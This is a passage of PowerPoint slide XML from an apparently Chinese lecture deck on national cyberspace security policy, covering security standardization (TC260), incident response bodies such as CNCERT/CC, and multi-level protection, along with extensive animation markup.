                                              <p:pRg st="5" end="5"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="29" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="512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12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123">
                                            <p:txEl>
                                              <p:pRg st="6" end="6"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="35" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="512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12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123">
                                            <p:txEl>
                                              <p:pRg st="7" end="7"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="39" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="512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12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123">
                                            <p:txEl>
                                              <p:pRg st="8" end="8"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="43" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="512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12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123">
                                            <p:txEl>
                                              <p:pRg st="9" end="9"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="49" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="512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123">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123">
                                            <p:txEl>
                                              <p:pRg st="10" end="10"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="53" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="5123">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123">
                                            <p:txEl>
                                              <p:pRg st="10" end="10"/>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5123">
                                            <p:txEl>
                                              <p:pRg st="11" end="11"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="57" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="5123">
                                            <p:txEl>
                                              <p:pRg st="11" end="11"/>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12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5123">
                                            <p:txEl>
                                              <p:pRg st="12" end="12"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="63" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="5123">
                                            <p:txEl>
                                              <p:pRg st="12" end="12"/>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5123">
                                            <p:txEl>
                                              <p:pRg st="12" end="12"/>
                                            </p:tx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123">
                                            <p:txEl>
                                              <p:pRg st="13" end="13"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="67" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="5123">
                                            <p:txEl>
                                              <p:pRg st="13" end="1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123">
                                            <p:txEl>
                                              <p:pRg st="13" end="13"/>
                                            </p:tx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5123">
                                            <p:txEl>
                                              <p:pRg st="14" end="14"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="71" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="5123">
                                            <p:txEl>
                                              <p:pRg st="14" end="14"/>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512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5123">
                                            <p:txEl>
                                              <p:pRg st="15" end="15"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="77" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="5123">
                                            <p:txEl>
                                              <p:pRg st="15" end="15"/>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5123">
                                            <p:txEl>
                                              <p:pRg st="15" end="15"/>
                                            </p:txEl>
                                          </p:spTgt>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5123">
                                            <p:txEl>
                                              <p:pRg st="16" end="16"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="81" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="5123">
                                            <p:txEl>
                                              <p:pRg st="16" end="16"/>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5123">
                                            <p:txEl>
                                              <p:pRg st="16" end="16"/>
                                            </p:txEl>
                                          </p:spTgt>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5123">
                                            <p:txEl>
                                              <p:pRg st="17" end="17"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="85" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="5123">
                                            <p:txEl>
                                              <p:pRg st="17" end="17"/>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12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02B57F5E-BB90-4246-BC79-F5793CDBCD60}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US" sz="1000" smtClean="0">
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:pPr eaLnBrk="1" hangingPunct="1"/>
              <a:t>104</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000">
              <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5123" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="541504" y="1556792"/>
            <a:ext cx="8422983" cy="2088232"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>意义</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>政府进行宏观管理的重要依据，同时也是保护国家利益、促进产业发展的重要手段之一</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>解决</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>安全产品和系统在设计、研发、生产、建设、使用、测评中的一致性、可靠性、可控性、先进性和符合性的技术规范与依据</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5124" name="标题 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="899592" y="746123"/>
            <a:ext cx="4716128" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>网络空间安全标准化</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="矩形 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="541504" y="3667240"/>
            <a:ext cx="8422983" cy="1877437"/>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实践历程</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750" eaLnBrk="0" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF9900"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>2002</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>年</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>4</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>月，全国信息安全标准化技术委员会（简称“信安标委”，委员会编号为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>TC260</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>）正式成立</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形成我国网络空间安全标准体系框架，并以该标准体系框架作为指导我国配套标准的研究制定工作</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="696057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anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="11"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anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="15"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1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P spid="2"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34244" y="695959"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>网络空间安全应急处理与信息通报 </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="514350" y="3209322"/>
            <a:ext cx="8191500" cy="2448272"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="85000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>实践历程</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" kern="1200" dirty="0">
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>我国的应急响应机构</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" kern="1200" dirty="0">
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>：</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" kern="1200" dirty="0">
              <a:cs typeface="+mn-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="1800" dirty="0"/>
              <a:t>包括</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0"/>
              <a:t>CNCERT/CC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="1800" dirty="0"/>
              <a:t>、</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="1800" dirty="0"/>
              <a:t>中国教育和科研计算机网紧急响应组（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0"/>
              <a:t>CCERT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="1800" dirty="0"/>
              <a:t>）</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>、</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>国家计算机病毒应急处理中心、</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>国家计算机网络入侵防范中心、</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>国家</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0"/>
              <a:t>863</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>计划反计算机入侵和防病毒研究中心</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900">
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" kern="1200" dirty="0">
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>根据“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" kern="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>谁主管、谁负责；谁经营，谁负责”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" kern="1200" dirty="0">
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>的原则，采用分类、分级的处理方式，规范网络与网络空间安全的预警和通报工作</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="矩形 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="611560" y="1411492"/>
            <a:ext cx="8136904" cy="1569660"/>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意义</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900" eaLnBrk="0" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF9900"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>有利于提高基础信息网络与重要信息系统的网络空间安全防范、保障能力</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900" eaLnBrk="0" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF9900"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>助于加强国家网络与网络空间安全应急处置工作</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="10999554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p:cTn id="33"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3">
                                            <p:txEl>
                                              <p:pRg st="4" end="4"/>
                                            </p:txEl>
                                          </p:spTgt>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 calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="38"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9"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0" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3">
                                            <p:txEl>
                                              <p:pRg st="5" end="5"/>
                                            </p:txEl>
                                          </p:spTgt>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p:cTn id="43"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45" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3">
                                            <p:txEl>
                                              <p:pRg st="6" end="6"/>
                                            </p:txEl>
                                          </p:spTgt>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 calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="48"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49"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5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692696"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>网络空间安全等级保护 </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="683568" y="3140968"/>
            <a:ext cx="8191500" cy="2520280"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>实践历程</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" kern="1200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>制定准则、规范和标准</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" kern="1200" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="+mn-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" kern="1200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>强化制度</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" kern="1200" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="+mn-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" kern="1200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>基础调研</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" kern="1200" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="+mn-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" kern="1200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>组织</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" kern="1200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>试点</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" kern="1200" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="+mn-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" kern="1200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>快速推进</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2000" kern="1200" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="+mn-cs"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="矩形 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="611560" y="1463761"/>
            <a:ext cx="8191500" cy="1569660"/>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意义</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="28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ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>保障网络空间安全与信息化建设相协调</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750" eaLnBrk="0" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF9900"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>重点保障基础信息网络和关系国家安全、经济命脉、社会稳定等方面的重要信息系统的安全</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3820018673"/>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22525" y="1579716"/>
            <a:ext cx="7377867" cy="923330"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
